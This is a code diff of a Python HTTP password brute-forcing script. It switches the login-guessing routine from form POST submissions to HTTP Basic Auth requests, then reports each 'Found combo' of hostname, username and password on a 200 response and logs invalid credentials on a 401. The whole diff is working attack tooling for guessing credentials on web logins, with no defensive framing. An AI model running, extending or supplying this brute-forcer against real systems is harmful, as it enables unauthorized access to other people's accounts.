@@ -1,8 +1,9 @@
 # Python Script for HTTP Brute Force
 
 # Importing Modules
-import requests, os
 from colorama import init, Fore
+from requests.auth import HTTPBasicAuth
+import requests, os
 
 init()
 GREEN = Fore.GREEN
@@ -10,15 +11,15 @@ RESET = Fore.RESET
 
 class HTTP_brute:
     def httpbrute(hostname, username, password):
-        # Data needed
-        data = {'username':username, 'password':password, "Login":'submit'}
-
-        send_data_url = requests.post(hostname, data=data)
-        if "Login failed" in str(send_data_url.content):
-            print(f"[!] Invalid credentials for {username}:{password}")
-        else:
-            print(f"{GREEN}[+] Found combo:\n\tHostname: {hostname}\n\tUsername: {username}\n\tPassword: {password}{RESET}")
+        check = requests.get(hostname, auth=HTTPBasicAuth(username, password))
+        r = check.status_code
+        if r == 200:
+            print(
+                f"{GREEN}[+] Found combo:\n\tHostname: {hostname}\n\tUsername: {username}\n\tPassword: {password}{RESET}")
             return True
+
+        elif r == 401:
+            print(f"[!] Invalid credentials for {username}:{password}")
 
     def run(hostname):
         # Read the file
